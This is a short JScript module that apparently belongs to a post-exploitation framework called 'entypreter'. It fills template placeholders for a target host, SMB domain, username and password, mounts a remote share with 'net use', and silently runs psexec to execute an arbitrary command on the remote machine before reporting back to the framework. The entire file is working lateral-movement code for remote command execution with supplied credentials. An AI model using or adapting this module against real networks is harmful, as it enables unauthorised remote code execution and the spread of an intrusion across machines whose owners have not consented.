try
{
    var rpath = "~RPATH~"
    var UNC = "~RPATH~\\psexec.exe ";
    var domain = "~SMBDOMAIN~";
    var user = "~SMBUSER~";
    var pwd = "~SMBPASS~";
    var computer = "\\\\~RHOST~ ";

    UNC += computer;

    if (user != "" && pwd != "")
    {
        if (domain != "" && domain != ".")
        {
            user = '"' + domain + "\\" + user + '"';
        }

        UNC += "-u " + user + " -p " + pwd + " ";
    }

    UNC += " -accepteula ~CMD~";

    // crappy hack to make sure it mounts

    var output = entypreter.shell.exec("net use * " + rpath, "~DIRECTORY~\\"+entypreter.uuid()+".txt");

    if (output.indexOf("Drive") != -1)
    {
        var drive = output.split(" ")[1];
        entypreter.shell.run("net use " + drive + " /delete", true);
    }

    entypreter.WS.Run("%comspec% /q /c " + UNC, 0, true);

    entypreter.work.report("Complete");
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
